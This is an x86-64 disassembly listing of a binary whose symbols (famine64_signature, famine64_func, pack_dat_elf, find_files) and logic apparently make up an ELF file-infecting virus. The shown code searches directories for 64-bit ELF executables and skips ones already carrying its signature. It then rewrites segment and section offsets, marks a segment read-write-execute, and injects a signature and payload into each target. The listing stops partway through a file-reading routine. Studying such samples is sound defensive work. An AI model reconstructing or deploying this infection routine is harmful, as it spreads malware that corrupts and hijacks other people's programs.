
./new:     file format elf64-x86-64


Disassembly of section .init:

0000000000000610 <_init>:
 610:	sub    rsp,0x8
 614:	mov    rax,QWORD PTR [rip+0x2029c5]        # 202fe0 <__gmon_start__>
 61b:	test   rax,rax
 61e:	je     622 <_init+0x12>
 620:	call   rax
 622:	add    rsp,0x8
 626:	ret    

Disassembly of section .plt:

0000000000000630 <.plt>:
 630:	push   QWORD PTR [rip+0x2029d2]        # 203008 <_GLOBAL_OFFSET_TABLE_+0x8>
 636:	jmp    QWORD PTR [rip+0x2029d4]        # 203010 <_GLOBAL_OFFSET_TABLE_+0x10>
 63c:	nop    DWORD PTR [rax+0x0]

0000000000000640 <puts@plt>:
 640:	jmp    QWORD PTR [rip+0x2029d2]        # 203018 <puts@GLIBC_2.2.5>
 646:	push   0x0
 64b:	jmp    630 <.plt>

0000000000000650 <write@plt>:
 650:	jmp    QWORD PTR [rip+0x2029ca]        # 203020 <write@GLIBC_2.2.5>
 656:	push   0x1
 65b:	jmp    630 <.plt>

0000000000000660 <printf@plt>:
 660:	jmp    QWORD PTR [rip+0x2029c2]        # 203028 <printf@GLIBC_2.2.5>
 666:	push   0x2
 66b:	jmp    630 <.plt>

0000000000000670 <syscall@plt>:
 670:	jmp    QWORD PTR [rip+0x2029ba]        # 203030 <syscall@GLIBC_2.2.5>
 676:	push   0x3
 67b:	jmp    630 <.plt>

Disassembly of section .plt.got:

0000000000000680 <.plt.got>:
 680:	jmp    QWORD PTR [rip+0x202972]        # 202ff8 <__cxa_finalize@GLIBC_2.2.5>
 686:	xchg   ax,ax

Disassembly of section .text:

0000000000000690 <main>:
     690:	push   rbx
     691:	lea    rdi,[rip+0x15e5]        # 1c7d <_IO_stdin_used+0x6d>
     698:	lea    rax,[rip+0x15e9]        # 1c88 <_IO_stdin_used+0x78>
     69f:	sub    rsp,0x20
     6a3:	mov    QWORD PTR [rsp],rdi
     6a7:	mov    QWORD PTR [rsp+0x8],rax
     6ac:	mov    rbx,rsp
     6af:	mov    QWORD PTR [rsp+0x10],0x0
     6b8:	add    rbx,0x8
     6bc:	call   12a0 <find_files>
     6c1:	mov    rdi,QWORD PTR [rbx]
     6c4:	test   rdi,rdi
     6c7:	jne    6b8 <main+0x28>
     6c9:	add    rsp,0x20
     6cd:	xor    eax,eax
     6cf:	pop    rbx
     6d0:	ret    
     6d1:	nop    WORD PTR cs:[rax+rax*1+0x0]
     6db:	nop    DWORD PTR [rax+rax*1+0x0]

00000000000006e0 <_start>:
     6e0:	xor    ebp,ebp
     6e2:	mov    r9,rdx
     6e5:	pop    rsi
     6e6:	mov    rdx,rsp
     6e9:	and    rsp,0xfffffffffffffff0
     6ed:	push   rax
     6ee:	push   rsp
     6ef:	lea    r8,[rip+0x150a]        # 1c00 <__libc_csu_fini>
     6f6:	lea    rcx,[rip+0x1493]        # 1b90 <__libc_csu_init>
     6fd:	lea    rdi,[rip+0xffffffffffffff8c]        # 690 <main>
     704:	call   QWORD PTR [rip+0x2028ce]        # 202fd8 <__libc_start_main@GLIBC_2.2.5>
     70a:	hlt    
     70b:	nop    DWORD PTR [rax+rax*1+0x0]

0000000000000710 <deregister_tm_clones>:
     710:	lea    rdi,[rip+0x202931]        # 203048 <__TMC_END__>
     717:	lea    rax,[rip+0x202931]        # 20304f <__TMC_END__+0x7>
     71e:	push   rbp
     71f:	sub    rax,rdi
     722:	mov    rbp,rsp
     725:	cmp    rax,0xe
     729:	jbe    740 <deregister_tm_clones+0x30>
     72b:	mov    rax,QWORD PTR [rip+0x20289e]        # 202fd0 <_ITM_deregisterTMCloneTable>
     732:	test   rax,rax
     735:	je     740 <deregister_tm_clones+0x30>
     737:	pop    rbp
     738:	jmp    rax
     73a:	nop    WORD PTR [rax+rax*1+0x0]
     740:	pop    rbp
     741:	ret    
     742:	nop    DWORD PTR [rax+0x0]
     746:	nop    WORD PTR cs:[rax+rax*1+0x0]

0000000000000750 <register_tm_clones>:
     750:	lea    rdi,[rip+0x2028f1]        # 203048 <__TMC_END__>
     757:	lea    rsi,[rip+0x2028ea]        # 203048 <__TMC_END__>
     75e:	push   rbp
     75f:	sub    rsi,rdi
     762:	mov    rbp,rsp
     765:	sar    rsi,0x3
     769:	mov    rax,rsi
     76c:	shr    rax,0x3f
     770:	add    rsi,rax
     773:	sar    rsi,1
     776:	je     790 <register_tm_clones+0x40>
     778:	mov    rax,QWORD PTR [rip+0x202871]        # 202ff0 <_ITM_registerTMCloneTable>
     77f:	test   rax,rax
     782:	je     790 <register_tm_clones+0x40>
     784:	pop    rbp
     785:	jmp    rax
     787:	nop    WORD PTR [rax+rax*1+0x0]
     790:	pop    rbp
     791:	ret    
     792:	nop    DWORD PTR [rax+0x0]
     796:	nop    WORD PTR cs:[rax+rax*1+0x0]

00000000000007a0 <__do_global_dtors_aux>:
     7a0:	cmp    BYTE PTR [rip+0x2028a1],0x0        # 203048 <__TMC_END__>
     7a7:	jne    7d0 <__do_global_dtors_aux+0x30>
     7a9:	cmp    QWORD PTR [rip+0x202847],0x0        # 202ff8 <__cxa_finalize@GLIBC_2.2.5>
     7b1:	push   rbp
     7b2:	mov    rbp,rsp
     7b5:	je     7c3 <__do_global_dtors_aux+0x23>
     7b7:	mov    rdi,QWORD PTR [rip+0x202882]        # 203040 <__dso_handle>
     7be:	call   680 <.plt.got>
     7c3:	call   710 <deregister_tm_clones>
     7c8:	pop    rbp
     7c9:	mov    BYTE PTR [rip+0x202878],0x1        # 203048 <__TMC_END__>
     7d0:	repz ret 
     7d2:	nop    DWORD PTR [rax+0x0]
     7d6:	nop    WORD PTR cs:[rax+rax*1+0x0]

00000000000007e0 <frame_dummy>:
     7e0:	lea    rdi,[rip+0x2025e1]        # 202dc8 <__JCR_END__>
     7e7:	cmp    QWORD PTR [rdi],0x0
     7eb:	jne    7f8 <frame_dummy+0x18>
     7ed:	jmp    750 <register_tm_clones>
     7f2:	nop    WORD PTR [rax+rax*1+0x0]
     7f8:	mov    rax,QWORD PTR [rip+0x2027e9]        # 202fe8 <_Jv_RegisterClasses>
     7ff:	test   rax,rax
     802:	je     7ed <frame_dummy+0xd>
     804:	push   rbp
     805:	mov    rbp,rsp
     808:	call   rax
     80a:	pop    rbp
     80b:	jmp    750 <register_tm_clones>

0000000000000810 <check_dat_elf>:
     810:	xor    eax,eax
     812:	cmp    rdi,0x3f
     816:	jbe    820 <check_dat_elf+0x10>
     818:	cmp    DWORD PTR [rsi],0x464c457f
     81e:	je     828 <check_dat_elf+0x18>
     820:	repz ret 
     822:	nop    WORD PTR [rax+rax*1+0x0]
     828:	cmp    BYTE PTR [rsi+0x4],0x2
     82c:	jne    820 <check_dat_elf+0x10>
     82e:	cmp    BYTE PTR [rsi+0x5],0x0
     832:	je     820 <check_dat_elf+0x10>
     834:	cmp    BYTE PTR [rsi+0x6],0x1
     838:	jne    820 <check_dat_elf+0x10>
     83a:	movzx  ecx,WORD PTR [rsi+0x10]
     83e:	lea    edx,[rcx-0x2]
     841:	cmp    dx,0x1
     845:	ja     820 <check_dat_elf+0x10>
     847:	cmp    WORD PTR [rsi+0x12],0x3e
     84c:	jne    820 <check_dat_elf+0x10>
     84e:	cmp    QWORD PTR [rsi+0x20],0x40
     853:	jne    820 <check_dat_elf+0x10>
     855:	movzx  ecx,WORD PTR [rsi+0x38]
     859:	lea    rdx,[rcx*8+0x0]
     861:	sub    rdx,rcx
     864:	lea    rdx,[rdx*8+0x40]
     86c:	cmp    rdi,rdx
     86f:	jb     820 <check_dat_elf+0x10>
     871:	mov    r8,QWORD PTR [rsi+0x28]
     875:	cmp    r8,0x3f
     879:	jbe    820 <check_dat_elf+0x10>
     87b:	movzx  edx,WORD PTR [rsi+0x3c]
     87f:	mov    rcx,rdx
     882:	shl    rdx,0x6
     886:	add    rdx,r8
     889:	cmp    rdi,rdx
     88c:	jb     820 <check_dat_elf+0x10>
     88e:	cmp    DWORD PTR [rsi+0x34],0x380040
     895:	jne    820 <check_dat_elf+0x10>
     897:	cmp    WORD PTR [rsi+0x3a],0x40
     89c:	jne    820 <check_dat_elf+0x10>
     89e:	movzx  edx,WORD PTR [rsi+0x3e]
     8a2:	test   dx,dx
     8a5:	sete   al
     8a8:	cmp    cx,dx
     8ab:	setbe  dl
     8ae:	or     eax,edx
     8b0:	xor    eax,0x1
     8b3:	movzx  eax,al
     8b6:	ret    
     8b7:	nop    WORD PTR [rax+rax*1+0x0]

00000000000008c0 <pack_dat_elf>:
     8c0:	push   r15
     8c2:	push   r14
     8c4:	mov    rax,rdx
     8c7:	push   r13
     8c9:	push   r12
     8cb:	mov    r13,rdx
     8ce:	push   rbp
     8cf:	push   rbx
     8d0:	sub    rsp,0x38
     8d4:	add    rax,QWORD PTR [rdx+0x20]
     8d8:	movzx  ebp,WORD PTR [rdx+0x3c]
     8dc:	add    r13,QWORD PTR [rdx+0x28]
     8e0:	mov    QWORD PTR [rsp],rax
     8e4:	movzx  eax,WORD PTR [rdx+0x3e]
     8e8:	shl    rax,0x6
     8ec:	test   rbp,rbp
     8ef:	mov    r14,QWORD PTR [r13+rax*1+0x18]
     8f4:	je     996 <pack_dat_elf+0xd6>
     8fa:	lea    r15,[rip+0x1313]        # 1c14 <_IO_stdin_used+0x4>
     901:	mov    QWORD PTR [rsp+0x8],r13
     906:	mov    r11,r13
     909:	xor    ebx,ebx
     90b:	nop    DWORD PTR [rax+rax*1+0x0]
     910:	mov    eax,DWORD PTR [r11]
     913:	mov    r12,r11
     916:	add    rax,r14
     919:	add    rax,rdx
     91c:	je     956 <pack_dat_elf+0x96>
     91e:	movzx  ecx,BYTE PTR [rax]
     921:	test   cl,cl
     923:	je     956 <pack_dat_elf+0x96>
     925:	cmp    cl,0x2e
     928:	jne    956 <pack_dat_elf+0x96>
     92a:	mov    r8,r15
     92d:	jmp    93d <pack_dat_elf+0x7d>
     92f:	nop
     930:	cmp    cl,r9b
     933:	mov    r8,r10
     936:	jne    951 <pack_dat_elf+0x91>
     938:	test   r9b,r9b
     93b:	je     951 <pack_dat_elf+0x91>
     93d:	add    rax,0x1
     941:	movzx  ecx,BYTE PTR [rax]
     944:	lea    r10,[r8+0x1]
     948:	movzx  r9d,BYTE PTR [r8+0x1]
     94d:	test   cl,cl
     94f:	jne    930 <pack_dat_elf+0x70>
     951:	cmp    cl,r9b
     954:	je     9a5 <pack_dat_elf+0xe5>
     956:	add    rbx,0x1
     95a:	add    r11,0x40
     95e:	cmp    rbx,rbp
     961:	jne    910 <pack_dat_elf+0x50>
     963:	mov    r8,QWORD PTR [rdx+0x18]
     967:	mov    rax,r13
     96a:	xor    r9d,r9d
     96d:	nop    DWORD PTR [rax]
     970:	mov    rcx,QWORD PTR [rax+0x18]
     974:	mov    r12,rax
     977:	cmp    rcx,r8
     97a:	ja     989 <pack_dat_elf+0xc9>
     97c:	add    rcx,QWORD PTR [rax+0x20]
     980:	cmp    rcx,r8
     983:	ja     cb6 <pack_dat_elf+0x3f6>
     989:	add    r9,0x1
     98d:	add    rax,0x40
     991:	cmp    r9,rbp
     994:	jne    970 <pack_dat_elf+0xb0>
     996:	add    rsp,0x38
     99a:	pop    rbx
     99b:	pop    rbp
     99c:	pop    r12
     99e:	pop    r13
     9a0:	pop    r14
     9a2:	pop    r15
     9a4:	ret    
     9a5:	movzx  r8d,WORD PTR [rdx+0x38]
     9aa:	test   r8,r8
     9ad:	je     963 <pack_dat_elf+0xa3>
     9af:	mov    rax,QWORD PTR [rsp]
     9b3:	xor    ecx,ecx
     9b5:	jmp    9cd <pack_dat_elf+0x10d>
     9b7:	nop    WORD PTR [rax+rax*1+0x0]
     9c0:	add    rcx,0x1
     9c4:	add    rax,0x38
     9c8:	cmp    rcx,r8
     9cb:	je     963 <pack_dat_elf+0xa3>
     9cd:	cmp    DWORD PTR [rax],0x1
     9d0:	mov    rbx,rax
     9d3:	jne    9c0 <pack_dat_elf+0x100>
     9d5:	mov    r10,QWORD PTR [r11+0x18]
     9d9:	mov    r9,QWORD PTR [rax+0x10]
     9dd:	cmp    r10,r9
     9e0:	jb     9c0 <pack_dat_elf+0x100>
     9e2:	add    r9,QWORD PTR [rax+0x20]
     9e6:	cmp    r10,r9
     9e9:	jae    9c0 <pack_dat_elf+0x100>
     9eb:	mov    r8,QWORD PTR [rdx+0x18]
     9ef:	mov    r15,QWORD PTR [rdx+r8*1-0x8]
     9f4:	mov    DWORD PTR [rsp+0x1c],esi
     9f8:	mov    rbp,rdi
     9fb:	mov    rsi,rdi
     9fe:	lea    rdi,[rip+0x1215]        # 1c1a <_IO_stdin_used+0xa>
     a05:	xor    eax,eax
     a07:	mov    r14,rdx
     a0a:	mov    rdx,r15
     a0d:	call   660 <printf@plt>
     a12:	cmp    r15,QWORD PTR [rip+0x937]        # 1350 <famine64_signature>
     a19:	je     d08 <pack_dat_elf+0x448>
     a1f:	xor    eax,eax
     a21:	mov    edx,0x281
     a26:	mov    rsi,rbp
     a29:	mov    edi,0x2
     a2e:	call   670 <syscall@plt>
     a33:	cmp    eax,0xffffffff
     a36:	mov    QWORD PTR [rsp+0x10],rax
     a3b:	mov    DWORD PTR [rsp+0x18],eax
     a3f:	je     d21 <pack_dat_elf+0x461>
     a45:	mov    rbp,QWORD PTR [rbx+0x20]
     a49:	add    rbp,QWORD PTR [rbx+0x8]
     a4d:	mov    rax,QWORD PTR [r14+0x18]
     a51:	movzx  ecx,WORD PTR [r14+0x38]
     a56:	sub    rax,rbp
     a59:	mov    QWORD PTR [rsp+0x28],rax
     a5e:	lea    rax,[rbp+0x8]
     a62:	test   rcx,rcx
     a65:	mov    QWORD PTR [r14+0x18],rax
     a69:	je     d44 <pack_dat_elf+0x484>
     a6f:	mov    rdi,QWORD PTR [rsp]
     a73:	lea    rdx,[rcx*8+0x0]
     a7b:	xor    r15d,r15d
     a7e:	sub    rdx,rcx
     a81:	lea    rcx,[rdi+rdx*8]
     a85:	mov    rax,rdi
     a88:	nop    DWORD PTR [rax+rax*1+0x0]
     a90:	mov    rdx,QWORD PTR [rax+0x8]
     a94:	cmp    rbp,rdx
     a97:	jae    aaa <pack_dat_elf+0x1ea>
     a99:	test   r15,r15
     a9c:	je     d00 <pack_dat_elf+0x440>
     aa2:	cmp    rdx,QWORD PTR [r15+0x8]
     aa6:	cmovb  r15,rax
     aaa:	add    rax,0x38
     aae:	cmp    rcx,rax
     ab1:	jne    a90 <pack_dat_elf+0x1d0>
     ab3:	mov    esi,DWORD PTR [rip+0x1063]        # 1b1c <famine64_size>
     ab9:	lea    rdi,[rip+0x119b]        # 1c5b <_IO_stdin_used+0x4b>
     ac0:	xor    eax,eax
     ac2:	call   660 <printf@plt>
     ac7:	test   r15,r15
     aca:	je     996 <pack_dat_elf+0xd6>
     ad0:	mov    rsi,QWORD PTR [rbx+0x20]
     ad4:	mov    r10d,DWORD PTR [rip+0x1041]        # 1b1c <famine64_size>
     adb:	mov    rdx,rsi
     ade:	add    rdx,QWORD PTR [rbx+0x8]
     ae2:	lea    r8,[r10+0x8]
     ae6:	lea    rax,[rdx+r8*1]
     aea:	cmp    rax,QWORD PTR [r15+0x8]
     aee:	jbe    d19 <pack_dat_elf+0x459>
     af4:	xor    r15d,r15d
     af7:	nop    WORD PTR [rax+rax*1+0x0]
     b00:	add    r15,0x1000
     b07:	cmp    r8,r15
     b0a:	ja     b00 <pack_dat_elf+0x240>
     b0c:	movzx  edi,WORD PTR [r14+0x38]
     b11:	add    QWORD PTR [r14+0x28],r15
     b15:	test   rdi,rdi
     b18:	je     b5f <pack_dat_elf+0x29f>
     b1a:	mov    rax,QWORD PTR [rsp]
     b1e:	xor    r9d,r9d
     b21:	add    rax,0x8
     b25:	jmp    b37 <pack_dat_elf+0x277>
     b27:	nop    WORD PTR [rax+rax*1+0x0]
     b30:	mov    rdx,rsi
     b33:	add    rdx,QWORD PTR [rbx+0x8]
     b37:	mov    rcx,QWORD PTR [rax]
     b3a:	cmp    rcx,rdx
     b3d:	jb     b52 <pack_dat_elf+0x292>
     b3f:	add    rdx,r15
     b42:	cmp    rdx,QWORD PTR [rax+0x8]
     b46:	ja     996 <pack_dat_elf+0xd6>
     b4c:	add    rcx,r15
     b4f:	mov    QWORD PTR [rax],rcx
     b52:	add    r9,0x1
     b56:	add    rax,0x38
     b5a:	cmp    r9,rdi
     b5d:	jne    b30 <pack_dat_elf+0x270>
     b5f:	movzx  eax,WORD PTR [r14+0x3c]
     b64:	test   rax,rax
     b67:	je     b95 <pack_dat_elf+0x2d5>
     b69:	shl    rax,0x6
     b6d:	mov    rdx,rsi
     b70:	add    rdx,QWORD PTR [rbx+0x8]
     b74:	add    r13,rax
     b77:	mov    rax,QWORD PTR [rsp+0x8]
     b7c:	mov    rcx,QWORD PTR [rax+0x18]
     b80:	cmp    rcx,rdx
     b83:	jb     b8c <pack_dat_elf+0x2cc>
     b85:	add    rcx,r15
     b88:	mov    QWORD PTR [rax+0x18],rcx
     b8c:	add    rax,0x40
     b90:	cmp    r13,rax
     b93:	jne    b7c <pack_dat_elf+0x2bc>
     b95:	add    rsi,r15
     b98:	add    QWORD PTR [rbx+0x28],r15
     b9c:	mov    DWORD PTR [rbx+0x4],0x7
     ba3:	mov    QWORD PTR [rbx+0x20],rsi
     ba7:	mov    rbx,QWORD PTR [rsp+0x10]
     bac:	mov    rcx,rbp
     baf:	add    QWORD PTR [r12+0x20],r15
     bb4:	mov    rdx,r14
     bb7:	mov    edi,0x1
     bbc:	xor    eax,eax
     bbe:	mov    QWORD PTR [rsp+0x8],r8
     bc3:	mov    esi,ebx
     bc5:	mov    QWORD PTR [rsp],r10
     bc9:	call   670 <syscall@plt>
     bce:	lea    rdx,[rip+0x77b]        # 1350 <famine64_signature>
     bd5:	mov    ecx,0x8
     bda:	mov    esi,ebx
     bdc:	mov    edi,0x1
     be1:	xor    eax,eax
     be3:	call   670 <syscall@plt>
     be8:	mov    ecx,DWORD PTR [rip+0xf2e]        # 1b1c <famine64_size>
     bee:	lea    rdx,[rip+0x763]        # 1358 <famine64_func>
     bf5:	mov    esi,ebx
     bf7:	mov    edi,0x1
     bfc:	xor    eax,eax
     bfe:	sub    rcx,0x8
     c02:	call   670 <syscall@plt>
     c07:	lea    rdx,[rsp+0x28]
     c0c:	xor    eax,eax
     c0e:	mov    ecx,0x8
     c13:	mov    esi,ebx
     c15:	mov    edi,0x1
     c1a:	call   670 <syscall@plt>
     c1f:	mov    r8,QWORD PTR [rsp+0x8]
     c24:	cmp    r15,r8
     c27:	je     d3c <pack_dat_elf+0x47c>
     c2d:	mov    r10,QWORD PTR [rsp]
     c31:	cmp    r15,r8
     c34:	lea    r13,[r15-0x1]
     c38:	lea    r12,[rip+0x1055]        # 1c94 <_IO_stdin_used+0x84>
     c3f:	lea    rbx,[r10+0x7]
     c43:	jbe    c6a <pack_dat_elf+0x3aa>
     c45:	mov    r15d,DWORD PTR [rsp+0x18]
     c4a:	xor    eax,eax
     c4c:	mov    ecx,0x1
     c51:	mov    rdx,r12
     c54:	mov    esi,r15d
     c57:	mov    edi,0x1
     c5c:	sub    r13,0x1
     c60:	call   670 <syscall@plt>
     c65:	cmp    r13,rbx
     c68:	jne    c4a <pack_dat_elf+0x38a>
     c6a:	movsxd rcx,DWORD PTR [rsp+0x1c]
     c6f:	mov    rbx,QWORD PTR [rsp+0x10]
     c74:	lea    rdx,[r14+rbp*1]
     c78:	mov    edi,0x1
     c7d:	xor    eax,eax
     c7f:	mov    esi,ebx
     c81:	sub    rcx,0x1
     c85:	sub    rcx,rbp
     c88:	call   670 <syscall@plt>
     c8d:	mov    esi,ebx
     c8f:	mov    edi,0x3
     c94:	xor    eax,eax
     c96:	call   670 <syscall@plt>
     c9b:	lea    rdi,[rip+0xfce]        # 1c70 <_IO_stdin_used+0x60>
     ca2:	call   640 <puts@plt>
     ca7:	add    rsp,0x38
     cab:	pop    rbx
     cac:	pop    rbp
     cad:	pop    r12
     caf:	pop    r13
     cb1:	pop    r14
     cb3:	pop    r15
     cb5:	ret    
     cb6:	movzx  r9d,WORD PTR [rdx+0x38]
     cbb:	test   r9,r9
     cbe:	je     996 <pack_dat_elf+0xd6>
     cc4:	mov    rax,QWORD PTR [rsp]
     cc8:	xor    ecx,ecx
     cca:	jmp    ce1 <pack_dat_elf+0x421>
     ccc:	nop    DWORD PTR [rax+0x0]
     cd0:	add    rcx,0x1
     cd4:	add    rax,0x38
     cd8:	cmp    rcx,r9
     cdb:	je     996 <pack_dat_elf+0xd6>
     ce1:	cmp    DWORD PTR [rax],0x1
     ce4:	mov    rbx,rax
     ce7:	jne    cd0 <pack_dat_elf+0x410>
     ce9:	mov    r10,QWORD PTR [rax+0x10]
     ced:	cmp    r10,r8
     cf0:	ja     cd0 <pack_dat_elf+0x410>
     cf2:	add    r10,QWORD PTR [rax+0x20]
     cf6:	cmp    r10,r8
     cf9:	jbe    cd0 <pack_dat_elf+0x410>
     cfb:	jmp    9ef <pack_dat_elf+0x12f>
     d00:	mov    r15,rax
     d03:	jmp    aaa <pack_dat_elf+0x1ea>
     d08:	lea    rdi,[rip+0xf25]        # 1c34 <_IO_stdin_used+0x24>
     d0f:	call   640 <puts@plt>
     d14:	jmp    996 <pack_dat_elf+0xd6>
     d19:	mov    r15,r8
     d1c:	jmp    b95 <pack_dat_elf+0x2d5>
     d21:	lea    rsi,[rip+0xf21]        # 1c49 <_IO_stdin_used+0x39>
     d28:	mov    edx,0x11
     d2d:	mov    edi,0x1
     d32:	call   650 <write@plt>
     d37:	jmp    996 <pack_dat_elf+0xd6>
     d3c:	add    rbp,r15
     d3f:	jmp    c6a <pack_dat_elf+0x3aa>
     d44:	mov    esi,DWORD PTR [rip+0xdd2]        # 1b1c <famine64_size>
     d4a:	lea    rdi,[rip+0xf0a]        # 1c5b <_IO_stdin_used+0x4b>
     d51:	xor    eax,eax
     d53:	call   660 <printf@plt>
     d58:	jmp    996 <pack_dat_elf+0xd6>
     d5d:	nop    DWORD PTR [rax]

0000000000000d60 <get_dat_elf>:
     d60:	push   r15
     d62:	push   r14
     d64:	push   r13
     d66:	push   r12
     d68:	push   rbp
     d69:	push   rbx
     d6a:	sub    rsp,0x828
     d71:	movzx  edx,BYTE PTR [rdi]
     d74:	test   dl,dl
     d76:	je     128e <get_dat_elf+0x52e>
     d7c:	lea    r8,[rsp+0x1f]
     d81:	mov    eax,0x1
     d86:	nop    WORD PTR cs:[rax+rax*1+0x0]
     d90:	mov    BYTE PTR [r8+rax*1],dl
     d94:	mov    ecx,eax
     d96:	add    rax,0x1
     d9a:	movzx  edx,BYTE PTR [rdi+rax*1-0x1]
     d9f:	test   dl,dl
     da1:	jne    d90 <get_dat_elf+0x30>
     da3:	movzx  edx,BYTE PTR [rsi]
     da6:	test   dl,dl
     da8:	je     127c <get_dat_elf+0x51c>
     dae:	lea    rbx,[rsp+0x20]
     db3:	movsxd rdi,ecx
     db6:	mov    eax,0x1
     dbb:	mov    QWORD PTR [rsp+0x8],rbx
     dc0:	add    rdi,rbx
     dc3:	nop    DWORD PTR [rax+rax*1+0x0]
     dc8:	mov    BYTE PTR [rdi+rax*1-0x1],dl
     dcc:	mov    r8d,eax
     dcf:	add    rax,0x1
     dd3:	movzx  edx,BYTE PTR [rsi+rax*1-0x1]
     dd8:	test   dl,dl
     dda:	jne    dc8 <get_dat_elf+0x68>
     ddc:	mov    rsi,QWORD PTR [rsp+0x8]
     de1:	add    ecx,r8d
     de4:	movsxd rcx,ecx
     de7:	xor    eax,eax
     de9:	mov    edx,0x800
     dee:	mov    edi,0x2
     df3:	mov    BYTE PTR [rsp+rcx*1+0x20],0x0
     df8:	call   670 <syscall@plt>
     dfd:	cmp    eax,0xffffffff
     e00:	mov    rbp,rax
     e03:	mov    r12d,eax
     e06:	je     112a <get_dat_elf+0x3ca>
     e0c:	mov    esi,eax
     e0e:	mov    ecx,0x2
     e13:	xor    eax,eax
     e15:	mov    edx,0x1
     e1a:	mov    edi,0x8
     e1f:	call   670 <syscall@plt>
     e24:	test   eax,eax
     e26:	mov    QWORD PTR [rsp+0x10],rax
     e2b:	jle    111c <get_dat_elf+0x3bc>
     e31:	sub    rsp,0x8
     e35:	xor    esi,esi
     e37:	xor    eax,eax
     e39:	push   0x0
     e3b:	mov    edx,DWORD PTR [rsp+0x20]
     e3f:	mov    r9d,0xffffffff
     e45:	mov    r8d,0x22
     e4b:	mov    ecx,0x3
     e50:	mov    edi,0x9
     e55:	call   670 <syscall@plt>
     e5a:	mov    r14,rax
     e5d:	cmp    r14,0xffffffffffffffff
     e61:	pop    rax
     e62:	pop    rdx
     e63:	je     111c <get_dat_elf+0x3bc>
     e69:	xor    ecx,ecx
     e6b:	xor    edx,edx
     e6d:	xor    eax,eax
     e6f:	mov    esi,ebp
     e71:	mov    edi,0x8
     e76:	call   670 <syscall@plt>
     e7b:	test   rax,rax
     e7e:	js     11b6 <get_dat_elf+0x456>
     e84:	lea    rax,[r14+0x10]
     e88:	lea    r13,[rsp+0x420]
     e90:	mov    QWORD PTR [rsp+0x18],rbp
     e95:	xor    r15d,r15d
     e98:	mov    rdi,rax
     e9b:	lea    rax,[rsp+0x430]
     ea3:	mov    rbp,r13
     ea6:	mov    rbx,rdi
     ea9:	mov    QWORD PTR [rsp],rax
     ead:	mov    rax,r14
     eb0:	sub    rax,r13
     eb3:	mov    r13,r14
     eb6:	mov    r14,rax
     eb9:	nop    DWORD PTR [rax+0x0]
     ec0:	xor    edi,edi
     ec2:	xor    eax,eax
     ec4:	mov    ecx,0x400
     ec9:	mov    rdx,rbp
     ecc:	mov    esi,r12d
     ecf:	call   670 <syscall@plt>
     ed4:	test   eax,eax
     ed6:	jle    1166 <get_dat_elf+0x406>
     edc:	movsxd rdi,r15d
     edf:	lea    rdx,[rbx+rdi*1]
     ee3:	lea    r10,[rdi+r13*1]
     ee7:	cmp    rbp,rdx
     eea:	setae  cl
     eed:	cmp    QWORD PTR [rsp],r10
     ef1:	setbe  dl
     ef4:	or     cl,dl
     ef6:	je     113c <get_dat_elf+0x3dc>
     efc:	cmp    eax,0xf
     eff:	jbe    113c <get_dat_elf+0x3dc>
     f05:	lea    edi,[rax-0x10]
     f08:	xor    ecx,ecx
     f0a:	xor    esi,esi
     f0c:	shr    edi,0x4
     f0f:	add    edi,0x1
     f12:	mov    edx,edi
     f14:	shl    edx,0x4
     f17:	nop    WORD PTR [rax+rax*1+0x0]
     f20:	movdqa xmm0,XMMWORD PTR [rbp+rcx*1+0x0]
     f26:	add    esi,0x1
     f29:	add    rcx,0x10
     f2d:	movups XMMWORD PTR [rcx+r10*1-0x10],xmm0
     f33:	cmp    edi,esi
     f35:	ja     f20 <get_dat_elf+0x1c0>
     f37:	cmp    eax,edx
     f39:	je     1114 <get_dat_elf+0x3b4>
     f3f:	movsxd rcx,edx
     f42:	movzx  esi,BYTE PTR [rsp+rcx*1+0x420]
     f4a:	lea    ecx,[r15+rdx*1]
     f4e:	movsxd rcx,ecx
     f51:	mov    BYTE PTR [r13+rcx*1+0x0],sil
     f56:	lea    ecx,[rdx+0x1]
     f59:	cmp    eax,ecx
     f5b:	jle    1114 <get_dat_elf+0x3b4>
     f61:	movsxd rsi,ecx
     f64:	add    ecx,r15d
     f67:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
     f6f:	movsxd rcx,ecx
     f72:	mov    BYTE PTR [r13+rcx*1+0x0],sil
     f77:	lea    ecx,[rdx+0x2]
     f7a:	cmp    eax,ecx
     f7c:	jle    1114 <get_dat_elf+0x3b4>
     f82:	movsxd rsi,ecx
     f85:	add    ecx,r15d
     f88:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
     f90:	movsxd rcx,ecx
     f93:	mov    BYTE PTR [r13+rcx*1+0x0],sil
     f98:	lea    ecx,[rdx+0x3]
     f9b:	cmp    eax,ecx
     f9d:	jle    1114 <get_dat_elf+0x3b4>
     fa3:	movsxd rsi,ecx
     fa6:	add    ecx,r15d
     fa9:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
     fb1:	movsxd rcx,ecx
     fb4:	mov    BYTE PTR [r13+rcx*1+0x0],sil
     fb9:	lea    ecx,[rdx+0x4]
     fbc:	cmp    eax,ecx
     fbe:	jle    1114 <get_dat_elf+0x3b4>
     fc4:	movsxd rsi,ecx
     fc7:	add    ecx,r15d
     fca:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
     fd2:	movsxd rcx,ecx
     fd5:	mov    BYTE PTR [r13+rcx*1+0x0],sil
     fda:	lea    ecx,[rdx+0x5]
     fdd:	cmp    eax,ecx
     fdf:	jle    1114 <get_dat_elf+0x3b4>
     fe5:	movsxd rsi,ecx
     fe8:	add    ecx,r15d
     feb:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
     ff3:	movsxd rcx,ecx
     ff6:	mov    BYTE PTR [r13+rcx*1+0x0],sil
     ffb:	lea    ecx,[rdx+0x6]
     ffe:	cmp    eax,ecx
    1000:	jle    1114 <get_dat_elf+0x3b4>
    1006:	movsxd rsi,ecx
    1009:	add    ecx,r15d
    100c:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
    1014:	movsxd rcx,ecx
    1017:	mov    BYTE PTR [r13+rcx*1+0x0],sil
    101c:	lea    ecx,[rdx+0x7]
    101f:	cmp    eax,ecx
    1021:	jle    1114 <get_dat_elf+0x3b4>
    1027:	movsxd rsi,ecx
    102a:	add    ecx,r15d
    102d:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
    1035:	movsxd rcx,ecx
    1038:	mov    BYTE PTR [r13+rcx*1+0x0],sil
    103d:	lea    ecx,[rdx+0x8]
    1040:	cmp    eax,ecx
    1042:	jle    1114 <get_dat_elf+0x3b4>
    1048:	movsxd rsi,ecx
    104b:	add    ecx,r15d
